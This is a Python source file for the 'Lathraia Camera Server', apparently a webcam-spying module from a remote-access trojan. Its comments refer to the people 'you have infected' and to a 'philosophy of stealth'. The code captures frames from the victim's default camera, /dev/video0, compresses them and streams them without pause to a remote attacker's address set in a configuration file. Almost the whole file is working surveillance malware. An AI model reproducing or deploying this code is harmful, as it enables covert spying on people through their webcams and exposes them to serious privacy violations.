# This is the Lathraia Camera Server
# It is much like the Screen Server; in fact, these two programs both work with the same client.
# Instead, this just snaps RGB pixels of /dev/video0 (the default camera on Linux)
# then sends it over.
# Obviously, mouse movement and keyboard keys won't ever register through here; however, it is
# possible that we could control the camera in other ways.

# This program is much simpler! Ergo, if you want to study how we send "video" signals, study this.

# !!!! NOTE !!!!
# This program goes against the philosophy of stealth, in that it will make aware who ever you have
# infected, simply due to the fact that the webcam light will most probably turn on upon launching
# this program!

import pygame
import pygame.camera
import time
import socket

from configuration import *

from zlib import compress

# The camera resolution
RES_X = 640
RES_Y = 480

def main():
    while True:
        try:
            socketfd = socket.socket()
            socketfd.connect((IP_ADDRESS, VIDEO_PORT))

            socketfd.send(CALLSIGN.encode())

            time.sleep(.5)

            socketfd.send(str(RES_X).encode())
            socketfd.send(str(RES_Y).encode())

            pygame.camera.init()
            pygame.camera.list_cameras()
            cam = pygame.camera.Camera("/dev/video0", (RES_X, RES_Y)) # Default resolution is 640 x 480
            cam.start()

            while True:
                time.sleep(0.5)  # You might need something higher in the beginning
                img = cam.get_image()
                img_rgb = pygame.image.tostring(img, "RGB")
                pixels = compress(img_rgb, 8)

                # Send the size of the pixels length
                size = len(pixels)
                size_len = (size.bit_length() + 7) // 8
                socketfd.send(bytes([size_len]))

                # Send the actual pixels length
                size_bytes = size.to_bytes(size_len, 'big')
                socketfd.send(size_bytes)

                socketfd.sendall(pixels)
                
            cam.stop()
        except Exception as error:
            print(error)
            time.sleep(5)
            continue


if __name__ == "__main__":
    main()